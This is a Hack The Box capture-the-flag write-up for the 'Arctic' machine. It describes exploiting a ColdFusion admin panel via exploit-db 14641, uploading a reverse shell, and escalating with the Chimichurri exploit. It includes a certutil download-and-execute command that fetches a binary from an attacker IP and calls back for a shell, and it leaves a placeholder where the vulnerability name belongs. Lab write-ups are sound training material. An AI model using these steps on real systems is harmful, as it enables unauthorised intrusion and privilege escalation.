---
layout: post
title:  "HTB Arctic Machine Writeup"
date:   2020-1-2 00:10:00 +0000
categories: hackthebox
---

Arctic was an easy one that i wont forget due to how certain exploits are used.

# Recon
Port scanning shows port 5800 is open serving coldfusion
Some directory bruteforcing returns CFIDE which will be our admin endpoint.

# Pwning the webapp

Searching exploit-db, we find a suitable exploit that may assist in getting into the coldfusion admin panel. Exploit 14641 does some amazing things, it will retrieve the password hash of the admin/user of the panel and inject it into the html of the login form!
From this we get the password of 'happyday'. From there, gaining a reverse shell through coldfusion is fairly stock standard. Setup a scheduled task with an upload and output file with a web directory then upload a shell. Run the task and navigate to the saved directory with a listener to gain a shell as arctic\tolis

# Gaining root

Running 'systeminfo' on the box shows us theres no hotfixes installed and its not a brand new os. This particular box shows signs of being vulnerable to <???>. Download the Chimchurri exploit from github. Use a method of file transfer on windows like the following to recieve the file.
```
<run webserver to host file>
certutil -urlcache -split -f http://10.10.14.4/chimchurri.exe churr.exe
<execute exploit when new listener is running>
churr.exe 10.10.14.4 443
```
Thats it ! quick and easy root for arctic. 14641 is still one of the simplest and most effective exploits ive seen.
